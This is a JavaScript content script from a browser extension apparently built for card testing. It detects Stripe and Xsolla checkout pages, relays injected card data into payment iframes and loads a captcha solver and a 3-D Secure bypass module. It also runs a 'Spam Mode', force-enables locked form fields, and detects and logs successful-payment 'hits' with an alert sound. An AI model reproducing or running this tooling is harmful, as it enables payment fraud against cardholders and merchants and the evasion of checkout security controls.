/**
 * Toji Project - Main Content Script
 * Developed by @RealYashvirGaming
 */

(async () => {
    // Only run on actual pages, not extension pages
    if (window.location.protocol === 'chrome-extension:' || window.location.protocol === 'chrome:') return;

    console.log('[Toji] Content script running on:', window.location.hostname);

    let settings;
    try {
        settings = await chrome.runtime.sendMessage({ type: 'GET_SETTINGS' });
    } catch (e) {
        console.warn('[Toji] Could not get settings, using defaults.');
        settings = { enabled: true };
    }

    if (!settings || settings.enabled === false) {
        console.log('[Toji] Extension disabled — skipping.');
        return;
    }

    const hostname = window.location.hostname;
    const url = window.location.href;

    // Detect if we are in a Stripe-related context
    const isStripe = hostname.includes('stripe.com') ||
                     url.includes('checkout.stripe.com') ||
                     url.includes('buy.stripe.com') ||
                     !!document.querySelector('script[src*="stripe.com"]') ||
                     !!document.querySelector('iframe[name*="__privateStripe"]');

    const isXsolla = hostname.includes('xsolla.com') ||
                     hostname.includes('roblox.com') ||
                     hostname.includes('epicgames.com');

    const isStripeIframe = isStripe && window.self !== window.top;

    console.log('[Toji] Context —', { isStripe, isXsolla, isStripeIframe });

    console.log('[Toji] ⚡ MAIN-world stealth hooks already active via manifest injection');


    // Wait for DOM to be truly ready before filling
    const waitForBody = () => new Promise(resolve => {
        if (document.body) return resolve();
        const obs = new MutationObserver(() => {
            if (document.body) { obs.disconnect(); resolve(); }
        });
        obs.observe(document.documentElement, { childList: true });
    });

    await waitForBody();

    // Small delay for React/Vue frameworks to mount
    await new Promise(r => setTimeout(r, 800));

    if (isStripe) {
        // Load Stripe engine
        const { default: StripeEngine } = await import(chrome.runtime.getURL('src/engines/stripe.js'));
        await StripeEngine.run(settings);

        // Show HUD on main frame only
        if (window.self === window.top) {
            const { default: HUD } = await import(chrome.runtime.getURL('src/ui/hud-overlay.js'));
            HUD.show('⚡ Toji Engine Active — Stripe Detected');
            HUD.setStickyStatus('Spam Mode: ON');
        }
    } else if (isXsolla) {
        const { default: XsollaEngine } = await import(chrome.runtime.getURL('src/engines/xsolla.js'));
        await XsollaEngine.run(settings);

        if (window.self === window.top) {
            const { default: HUD } = await import(chrome.runtime.getURL('src/ui/hud-overlay.js'));
            HUD.show('⚡ Toji Engine Active — Xsolla Detected');
            HUD.setStickyStatus('Spam Mode: ON');
        }
    } else if (window.self === window.top) {
        // Generic autofill on main frame only
        const { default: AutofillEngine } = await import(chrome.runtime.getURL('src/engines/autofill.js'));
        await AutofillEngine.run(settings);
    }

    // Load captcha solver on every frame
    const { default: CaptchaManager } = await import(chrome.runtime.getURL('src/solvers/captcha-manager.js'));

    // ── Load Elite Protocols ──────────────────────────────────────────────
    if (settings.threeDBypass) {
        const { default: Auto3DS } = await import(chrome.runtime.getURL('src/stealth/auto-3ds.js'));
        await Auto3DS.run(settings);
    }

    // ── Global Event Listeners ──────────────────────────────────────────────
    // NOTE: SET_REAL_CARD relay bridge removed — injected.js is now natively
    // injected into all frames (incl. cross-origin iframes) via manifest.json
    // world:MAIN content_script. When the engine calls window.postMessage on
    // the main frame, the injected.js on THAT frame's window receives it.
    // For iframes, the engine must broadcast directly to each iframe window.
    // This is handled below in the engine bridge.

    // Relay SET_REAL_CARD from main frame down to all child iframes
    // (Since injected.js runs in each iframe's page context, just posting
    //  the message to each iframe's contentWindow is sufficient)
    window.addEventListener('message', (event) => {
        if (!event.data) return;

        // 1. Handle Card Data Broadcast (from Engine)
        if (event.data.type === 'SET_REAL_CARD' && !event.data._tojiFrameRelayed) {
            if (window.self === window.top) {
                // TOP FRAME: fan out to all child iframes
                // 3. Update window.name sync bridge (Professional stealth trick)
                // This makes the card data available SYNCHRONOUSLY to the injected script
                // even if postMessage is delayed.
                try {
                    const syncData = { type: 'TOJI_SYNC', card: event.data.card, elite: event.data.elite };
                    window.name = JSON.stringify(syncData);
                } catch(e){}

                // 4. Also broadcast to all children (Relay Bridge fallback)
                const msg = { ...event.data, _tojiFrameRelayed: true };
                document.querySelectorAll('iframe').forEach(f => {
                    try { f.contentWindow.postMessage(msg, '*'); } catch(e) {}
                });
                window._TOJI_LAST_CARD = msg; // Store for late-comers
            }
        }

        // 2. Handle Sync Request (from late-loading Iframes)
        if (event.data.type === 'TOJI_SYNC_REQUEST' && window.self === window.top && window._TOJI_LAST_CARD) {
            try {
                event.source.postMessage(window._TOJI_LAST_CARD, '*');
            } catch(e) {}
        }
    });

    // Re-send cached card to any iframe added dynamically (Stripe loads iframes late)
    if (window.self === window.top) {
        new MutationObserver(() => {
            if (!window._TOJI_LAST_CARD) return;
            document.querySelectorAll('iframe:not([_toji-sent])').forEach(f => {
                try {
                    f.setAttribute('_toji-sent', '1');
                    f.contentWindow.postMessage(window._TOJI_LAST_CARD, '*');
                    setTimeout(() => f.removeAttribute('_toji-sent'), 2000);
                } catch(e) {}
            });
        }).observe(document.documentElement, { childList: true, subtree: true });
    }

    // 1. Listen for Emergency Stop from Background

    chrome.runtime.onMessage.addListener((message) => {
        if (message.type === 'SYSTEM_STOP') {
            console.log('[Toji] 🛑 EMERGENCY STOP SIGNAL RECEIVED');
            window.TOJI_STOPPED = true;
            window.stop();
        }
    });
    
    // 2. Aggressive Unlocker Loop (ASHES Strategy)
    setInterval(() => {
        if (window.TOJI_STOPPED) return;
        const blocked = document.querySelectorAll('input[disabled], select[disabled], input[readonly], select[readonly], [style*="pointer-events: none"]');
        blocked.forEach(el => {
            el.removeAttribute('disabled');
            el.removeAttribute('readonly');
            if (el.disabled) el.disabled = false;
            if (el.readOnly) el.readOnly = false;
            el.style.pointerEvents = 'auto';
            el.style.opacity = '1';
        });
    }, 2000);

    // 4. URL/DOM Success Fallback (The 'Ashes' Strategy)
    const successKeywords = ['success', 'thank', 'paid', 'complete', 'confirmed', 'ordered'];
    const successURLs = ['/success', '/thank-you', '/confirmed', '/completed', '/order-status'];

    const checkSuccessPage = () => {
        if (window.TOJI_HIT_FOUND) return;
        
        const currentUrl = window.location.href.toLowerCase();
        const bodyText = document.body ? document.body.innerText.toLowerCase() : '';
        
        const urlMatch = successURLs.some(u => currentUrl.includes(u));
        const textMatch = (bodyText.includes('thank you') && (bodyText.includes('order') || bodyText.includes('payment'))) || 
                          (bodyText.includes('payment') && bodyText.includes('successful'));

        if (urlMatch || textMatch) {
            window.TOJI_HIT_FOUND = true;
            console.log('[Toji] 🎯 Success Page Detected via URL/DOM!');
            
            const payload = { 
                type: 'TOJI_CAPTURE', 
                success: true, 
                message: urlMatch ? 'REDIRECT_HIT' : 'DOM_HIT',
                url: window.location.href,
                data: { source: 'visual_detector' }
            };
            window.dispatchEvent(new CustomEvent('message', { detail: payload })); // Trigger local listener
            chrome.runtime.sendMessage({ type: 'LOG_RESPONSE', data: payload });
        }
    };

    window.addEventListener('message', async (event) => {
        if (!event.data) return;
        const data = event.data;

        // 1. Handle Intent Sync (Pre-computation)
        if (data.type === 'TOJI_INTENT_SYNC') {
            chrome.runtime.sendMessage({ 
                type: 'STORE_INTENT_CARD', 
                intentIds: data.intentIds || [], 
                card: data.card 
            });
            return;
        }

        // 2. Handle Capture (Response arrival)
        if (data.type === 'TOJI_CAPTURE') {
            if (data.success && !window.TOJI_HIT_FOUND) {
                window.TOJI_HIT_FOUND = true;
            }

            // Log everything to Dashboard
            chrome.runtime.sendMessage({ type: 'LOG_RESPONSE', data: data });

            // If we are in an iframe, bounce it up to the main window
            if (window.self !== window.top) {
                try { window.top.postMessage(data, '*'); } catch(e) {}
                return;
            }

            console.log('[Toji] Captured Response (Top Level):', data.message);

            if (data.success) {
                try {
                    const hitSound = new Audio(chrome.runtime.getURL('assets/hits.mp3'));
                    hitSound.volume = 1.0;
                    hitSound.play().catch(e => console.warn('[Toji] Audio play prevented by browser policy', e));
                } catch (err) {
                    console.error('[Toji] Failed to play hit sound:', err);
                }
            }

            // Load HUD and Display Popup in the Main Window
            const { default: HUD } = await import(chrome.runtime.getURL('src/ui/hud-overlay.js'));
            const type = data.success ? 'success' : 'error';
            HUD.show(data.message, type, 4000);

            // Notify active engine
            window.dispatchEvent(new CustomEvent('TOJI_RESPONSE_CAPTURED', { detail: data }));
        }
    });

})();
